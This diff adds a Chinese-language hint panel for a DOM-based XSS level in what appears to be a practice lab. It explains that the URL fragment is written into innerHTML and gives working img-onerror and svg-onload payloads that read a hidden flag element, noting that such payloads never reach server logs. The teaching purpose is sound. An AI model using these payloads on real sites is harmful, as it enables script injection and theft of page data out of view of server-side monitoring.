@@ -1,0 +1,17 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>DOM 型 XSS 的核心是<b>整个过程都在浏览器里完成，不经过服务器</b>。本关把 URL 中 <code>#</code> 后面的内容直接写入 <code>innerHTML</code>。思路：在 URL 的 <code>#</code> 后面构造能执行 JS 的标签（如 <code>&lt;img onerror&gt;</code>、<code>&lt;svg onload&gt;</code>）。注意 payload 在 <code>#</code> 后面，浏览器不会发给服务器，所以 Burp 的 HTTP history 里看不到。要显示隐藏的通关凭证，可以用 JS 读取通关凭证元素的内容。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>方法1 - 直接在地址栏追加 Hash：</b><br>
+<code><?php echo BASE_URL; ?>/modules/xss/dom.php#&lt;img src=x onerror=alert(1)&gt;</code><br>
+<b>方法2 - 用页面上的输入框写入（会自动编码后放进 # 后面）。</b><br>
+<b>显示隐藏的通关凭证（本关目标）：</b><br>
+<code>#&lt;svg onload="document.getElementById('domOut').innerHTML=document.getElementById('secretZone').textContent"&gt;</code><br>
+<b>或直接弹窗取出：</b><br>
+<code>#&lt;img src=x onerror=alert(document.getElementById('secretZone').textContent)&gt;</code><br>
+<b>与反射型的关键区别：</b>payload 在 <code>#</code> 后面，浏览器不会把它发给服务器，所以 Burp Proxy 的 HTTP history 里看不到，服务端日志也没有记录。
+</div>
+</details>
